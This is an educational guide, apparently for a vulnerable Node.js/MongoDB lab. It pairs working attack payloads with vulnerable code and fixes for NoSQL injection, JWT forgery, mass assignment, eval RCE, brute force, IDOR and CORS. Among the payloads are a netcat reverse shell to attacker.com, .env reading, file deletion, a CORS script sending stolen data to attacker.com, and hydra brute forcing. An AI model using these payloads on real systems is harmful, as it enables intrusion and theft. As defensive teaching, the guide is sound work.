# 🎯 Attack Examples & Exploits

**⚠️ WARNING: This document is for educational purposes only. Do NOT use these techniques against systems you don't own or have permission to test.**

## Table of Contents
1. [NoSQL Injection Attacks](#nosql-injection-attacks)
2. [Authentication Bypass](#authentication-bypass)
3. [Privilege Escalation](#privilege-escalation)
4. [Remote Code Execution](#remote-code-execution)
5. [Brute Force Attacks](#brute-force-attacks)
6. [Mass Assignment](#mass-assignment)
7. [IDOR (Insecure Direct Object Reference)](#idor)

---

## NoSQL Injection Attacks

### Attack 1: Login Bypass

**Vulnerable Code:**
```javascript
const user = await User.findOne({
  username: req.body.username,
  password: req.body.password
});
```

**Attack Payload:**
```bash
curl -X POST http://localhost:5000/api/login \
  -H "Content-Type: application/json" \
  -d '{
    "username": {"$ne": null},
    "password": {"$ne": null}
  }'
```

**What Happens:**
- The query becomes: `User.findOne({ username: {$ne: null}, password: {$ne: null} })`
- This matches ANY user where username and password exist
- Attacker logs in as the first user in database (often admin)

**How to Fix:**
```javascript
// Sanitize inputs
app.use(mongoSanitize());

// Or explicitly validate types
const { username, password } = req.body;
if (typeof username !== 'string' || typeof password !== 'string') {
  return res.status(400).json({ error: 'Invalid input' });
}
```

---

### Attack 2: Data Extraction

**Vulnerable Code:**
```javascript
app.get('/api/users/search', async (req, res) => {
  const users = await User.find(req.query);
  res.json(users);
});
```

**Attack Payloads:**

```bash
# Extract all users with specific role
curl 'http://localhost:5000/api/users/search?role=admin'

# If you are using cloud hosted mongodb database like Atlas, these will not work due to cloud security protections, they should work though for local databases
# Extract users with email containing domain
curl 'http://localhost:5000/api/users/search?email[$regex]=@company.com'

# Extract all users
curl 'http://localhost:5000/api/users/search?username[$exists]=true'

# Bypass filters
curl 'http://localhost:5000/api/users/search?balance[$gt]=1000'
```

**How to Fix:**
```javascript
app.get('/api/users/search', async (req, res) => {
  // Build safe query with only allowed fields
  const searchQuery = {};
  
  if (req.query.username && typeof req.query.username === 'string') {
    searchQuery.username = req.query.username;
  }
  
  const users = await User.find(searchQuery).limit(50);
  res.json(users);
});
```

---

## Authentication Bypass

### Attack 3: JWT Token Manipulation

**Vulnerable Scenarios:**
1. No signature verification
2. Weak secret key
3. Algorithm confusion (RS256 → HS256)

**Attack Example - Weak Secret:**
```bash
# If JWT_SECRET is weak (e.g., "secret"), can brute force
# Tools: jwt_tool, hashcat

# Create forged token with admin role
jwt_tool <token> -T -S hs256 -p secret
```

**Attack Example - Algorithm Confusion:**
```javascript
// Server expects RS256 but accepts HS256
// Attacker uses public key as HMAC secret
const forgedToken = jwt.sign(
  { userId: 'victim_id', role: 'admin' },
  publicKey, // Using public key as secret
  { algorithm: 'HS256' }
);
```

**How to Fix:**
```javascript
// Use strong secret (32+ random characters)
const JWT_SECRET = process.env.JWT_SECRET; // e.g., crypto.randomBytes(32).toString('hex')

// Explicitly specify algorithm
jwt.verify(token, JWT_SECRET, { algorithms: ['HS256'] });

// Never use weak secrets
if (JWT_SECRET.length < 32) {
  throw new Error('JWT secret too weak');
}
```

---

### Attack 4: Session Fixation

**Vulnerable Code:**
```javascript
// Token never expires or is invalidated
app.post('/api/logout', (req, res) => {
  res.json({ message: 'Logged out' });
  // Token still works!
});
```

**Attack:**
1. Attacker logs in and gets token
2. Attacker shares token with victim
3. Victim uses the token
4. Attacker still has access even after victim "logs out"

**How to Fix:**
```javascript
// Implement token blacklist
const tokenBlacklist = new Set();

app.post('/api/logout', authenticate, (req, res) => {
  tokenBlacklist.add(req.token);
  res.clearCookie('token');
  res.json({ success: true });
});

// Check blacklist in auth middleware
if (tokenBlacklist.has(token)) {
  return res.status(401).json({ message: 'Token revoked' });
}
```

---

## Privilege Escalation

### Attack 5: Mass Assignment

**Vulnerable Code:**
```javascript
app.put('/api/users/:id', async (req, res) => {
  const user = await User.findByIdAndUpdate(
    req.params.id,
    req.body, // Accepts ALL fields!
    { new: true }
  );
  res.json(user);
});
```

**Attack Payload:**
```bash
# Regular user escalates to admin
curl -X PUT http://localhost:5000/api/users/USER_ID \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "username": "victim",
    "role": "admin",
    "balance": 999999
  }'
```

**What Happens:**
- User can modify their own role to admin
- User can increase their balance
- User can modify any field in the schema

**How to Fix:**
```javascript
app.put('/api/users/:id', authenticate, async (req, res) => {
  // Ownership check
  if (req.params.id !== req.user._id.toString()) {
    return res.status(403).json({ error: 'Access denied' });
  }
  
  // Whitelist allowed fields
  const allowedUpdates = ['username', 'email'];
  const updates = {};
  
  allowedUpdates.forEach(field => {
    if (req.body[field] !== undefined) {
      updates[field] = req.body[field];
    }
  });
  
  const user = await User.findByIdAndUpdate(
    req.params.id,
    updates,
    { new: true, runValidators: true }
  );
  
  res.json(user);
});
```

---

### Attack 6: Role Manipulation During Registration

**Vulnerable Code:**
```javascript
app.post('/api/register', async (req, res) => {
  const user = new User(req.body); // Accepts ALL fields
  await user.save();
  res.json(user);
});
```

**Attack Payload:**
```bash
# Register as admin directly
curl -X POST http://localhost:5000/api/register \
  -H "Content-Type: application/json" \
  -d '{
    "username": "hacker",
    "email": "hacker@evil.com",
    "password": "password123",
    "role": "admin",
    "balance": 999999
  }'
```

**How to Fix:**
```javascript
app.post('/api/register', async (req, res) => {
  // Only accept specific fields
  const { username, email, password } = req.body;
  
  const user = new User({
    username,
    email,
    password: await bcrypt.hash(password, 12),
    role: 'user', // Force user role
    balance: 0    // Force default balance
  });
  
  await user.save();
  res.json({ user: { id: user._id, username: user.username } });
});
```

---

## Remote Code Execution

### Attack 7: eval() Exploitation

**Vulnerable Code:**
```javascript
app.post('/api/calculate', (req, res) => {
  const result = eval(req.body.expression);
  res.json({ result });
});
```

**Attack Payloads:**

```bash
# Read sensitive files
curl -X POST http://localhost:5000/api/calculate \
  -H "Content-Type: application/json" \
  -d '{"expression": "require(\"fs\").readFileSync(\".env\", \"utf8\")"}'

# Execute system commands
curl -X POST http://localhost:5000/api/calculate \
  -H "Content-Type: application/json" \
  -d '{"expression": "require(\"child_process\").execSync(\"ls -la\").toString()"}'

# Delete files (DANGEROUS!)
curl -X POST http://localhost:5000/api/calculate \
  -H "Content-Type: application/json" \
  -d '{"expression": "require(\"fs\").unlinkSync(\"important-file.txt\")"}'

# Create reverse shell
curl -X POST http://localhost:5000/api/calculate \
  -H "Content-Type: application/json" \
  -d '{"expression": "require(\"child_process\").exec(\"nc attacker.com 4444 -e /bin/sh\")"}'
```

**Impact:**
- Complete server takeover
- Read all files (including .env with secrets)
- Execute arbitrary commands
- Install malware
- Access database
- Pivot to internal network

**How to Fix:**
```javascript
// NEVER use eval()!

// Option 1: Use safe math library
const math = require('mathjs');
const result = math.evaluate(expression);

// Option 2: Strict validation + Function
if (!/^[\d\s\+\-\*\/\(\)\.]+$/.test(expression)) {
  return res.status(400).json({ error: 'Invalid expression' });
}
const result = Function('"use strict"; return (' + expression + ')')();
```

---

## Brute Force Attacks

### Attack 8: Password Brute Force

**Vulnerable Code:**
```javascript
// No rate limiting
app.post('/api/login', async (req, res) => {
  const user = await User.findOne({ username: req.body.username });
  if (user && await bcrypt.compare(req.body.password, user.password)) {
    res.json({ token: generateToken(user) });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});
```

**Attack Script:**
```bash
# Try common passwords
for password in password123 admin123 qwerty 12345678; do
  curl -X POST http://localhost:5000/api/login \
    -H "Content-Type: application/json" \
    -d "{\"username\": \"admin\", \"password\": \"$password\"}"
done

# Or use automated tools: hydra, medusa
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  http-post-form "/api/login:username=^USER^&password=^PASS^:Invalid credentials"
```

**How to Fix:**
```javascript
const rateLimit = require('express-rate-limit');

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 attempts
  message: 'Too many login attempts',
  skipSuccessfulRequests: true
});

app.post('/api/login', loginLimiter, async (req, res) => {
  // Login logic...
});

// Additional measures:
// - Account lockout after X failed attempts
// - CAPTCHA after Y failed attempts
// - Email notification on failed login attempts
// - Log suspicious activity
```

---

## IDOR (Insecure Direct Object Reference)

### Attack 9: Unauthorized Data Access

**Vulnerable Code:**
```javascript
app.get('/api/users/:id', async (req, res) => {
  const user = await User.findById(req.params.id);
  res.json(user); // No access control!
});

app.delete('/api/posts/:id', async (req, res) => {
  await Post.findByIdAndDelete(req.params.id);
  res.json({ success: true }); // No ownership check!
});
```

**Attack Examples:**

```bash
# Access other users' profiles
curl http://localhost:5000/api/users/507f1f77bcf86cd799439011

# Delete other users' posts
curl -X DELETE http://localhost:5000/api/posts/507f1f77bcf86cd799439012

# Enumerate all users
for id in {1..1000}; do
  curl http://localhost:5000/api/users/$id
done
```

**How to Fix:**
```javascript
// Add ownership check
app.get('/api/users/:id', authenticate, async (req, res) => {
  // Users can only view their own profile (unless admin)
  if (req.params.id !== req.user._id.toString() && 
      req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Access denied' });
  }
  
  const user = await User.findById(req.params.id);
  res.json(user);
});

// Check ownership for deletion
app.delete('/api/posts/:id', authenticate, async (req, res) => {
  const post = await Post.findById(req.params.id);
  
  if (!post) {
    return res.status(404).json({ error: 'Post not found' });
  }
  
  // Verify ownership
  if (post.authorId.toString() !== req.user._id.toString() &&
      req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Access denied' });
  }
  
  await Post.findByIdAndDelete(req.params.id);
  res.json({ success: true });
});
```

---

## Additional Attack Vectors

### Attack 10: CORS Misconfiguration

**Vulnerable Code:**
```javascript
app.use(cors()); // Allows ALL origins
```

**Attack:**
```html
<!-- Malicious website -->
<script>
fetch('http://victim-api.com/api/users/me', {
  credentials: 'include' // Send cookies
})
.then(r => r.json())
.then(data => {
  // Send stolen data to attacker
  fetch('http://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
</script>
```

**How to Fix:**
```javascript
const corsOptions = {
  origin: ['https://trusted-site.com'],
  credentials: true,
  optionsSuccessStatus: 200
};
app.use(cors(corsOptions));
```

---

### Attack 11: Timing Attacks

**Vulnerable Code:**
```javascript
app.post('/api/login', async (req, res) => {
  const user = await User.findOne({ username: req.body.username });
  
  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials' });
    // Returns immediately - fast response
  }
  
  const isValid = await bcrypt.compare(req.body.password, user.password);
  // Takes time to hash - slow response
  
  if (!isValid) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
});
```

**Attack:**
Measure response times to determine if username exists:
- Fast response = username doesn't exist
- Slow response = username exists (but password wrong)

**How to Fix:**
```javascript
app.post('/api/login', async (req, res) => {
  const user = await User.findOne({ username: req.body.username })
    .select('+password');
  
  // Always hash, even if user doesn't exist
  const passwordToCompare = user ? user.password : '$2b$12$dummy.hash.here';
  const isValid = await bcrypt.compare(req.body.password, passwordToCompare);
  
  if (!user || !isValid) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // Generate token...
});
```

---

## Defense Strategies Summary

### 1. Input Validation
- ✅ Validate all inputs
- ✅ Use express-validator
- ✅ Sanitize MongoDB inputs
- ✅ Reject unexpected fields

### 2. Authentication & Authorization
- ✅ Hash passwords (bcrypt)
- ✅ Use strong JWT secrets
- ✅ Implement token expiration
- ✅ Verify token signatures
- ✅ Check ownership
- ✅ Implement RBAC

### 3. Rate Limiting
- ✅ Limit login attempts
- ✅ Limit API requests
- ✅ Use sliding windows
- ✅ Implement account lockout

### 4. Access Control
- ✅ Authenticate all sensitive routes
- ✅ Verify resource ownership
- ✅ Never trust client data
- ✅ Validate IDs and permissions

### 5. Secure Configuration
- ✅ Use Helmet
- ✅ Configure CORS properly
- ✅ Limit request sizes
- ✅ Disable x-powered-by
- ✅ Use HTTPS in production

### 6. Error Handling
- ✅ Don't expose stack traces
- ✅ Use generic error messages
- ✅ Log security events
- ✅ Monitor for attacks

---

## Testing Your Application

### Security Testing Tools

```bash
# 1. npm audit - Check for known vulnerabilities
npm audit
npm audit fix

# 2. OWASP ZAP - Automated security testing
# Download from: https://www.zaproxy.org/

# 3. Burp Suite - Manual penetration testing
# Download from: https://portswigger.net/burp

# 4. SQLMap - NoSQL injection testing
sqlmap -u "http://localhost:5000/api/search?query=test" --level=5 --risk=3

# 5. Nikto - Web server scanner
nikto -h http://localhost:5000
```

### Manual Testing Checklist

- [ ] Try accessing protected routes without authentication
- [ ] Try modifying other users' data
- [ ] Try injecting NoSQL operators
- [ ] Test rate limiting (send 100 requests)
- [ ] Try privilege escalation during registration
- [ ] Test CORS from unauthorized origin
- [ ] Try sending oversized requests
- [ ] Test with invalid JWT tokens
- [ ] Try to access admin endpoints as regular user
- [ ] Check if passwords are hashed in database

---

## Remember

🎓 **Use these attacks only for:**
- Testing your own applications
- Authorized penetration testing
- Educational purposes
- Security research in controlled environments

⚠️ **Never use these techniques to:**
- Attack systems you don't own
- Access unauthorized data
- Harm others
- Break laws

**Ethical hacking requires authorization. Always get written permission before testing security on any system.**

---

**Stay legal. Stay ethical. Build secure applications.** 🔐
